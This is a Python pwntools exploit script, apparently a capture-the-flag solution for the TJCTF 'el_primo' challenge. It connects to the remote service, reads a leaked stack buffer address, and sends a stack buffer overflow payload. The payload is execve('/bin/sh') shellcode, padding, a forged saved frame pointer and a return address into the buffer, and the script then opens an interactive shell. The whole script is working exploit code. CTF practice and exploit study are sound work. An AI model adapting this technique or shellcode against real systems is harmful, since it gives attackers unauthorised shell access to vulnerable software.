from pwn import *

context.update(log_level='debug')
p = remote('p1.tjctf.org', 8011)
#p = process('el_primo')
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

p.recvuntil(': 0x')
addr_buf = int(p.recvrepeat(0.2)[:8],16)
log.info('addr_buf: ' + hex(addr_buf))


offset_toEBP_8 = 0x28-8

#raw_input('pid: ' + str(p.pid))

EBP_8 = p32(addr_buf+(offset_toEBP_8+4+0x20)+4)
RET = p32(addr_buf)
payload = shellcode + 'a'*(offset_toEBP_8 - len(shellcode)) + EBP_8 + 'a'*0x20 + RET
print 'payload: ' + payload.encode('hex')

p.sendline(payload)

p.interactive()




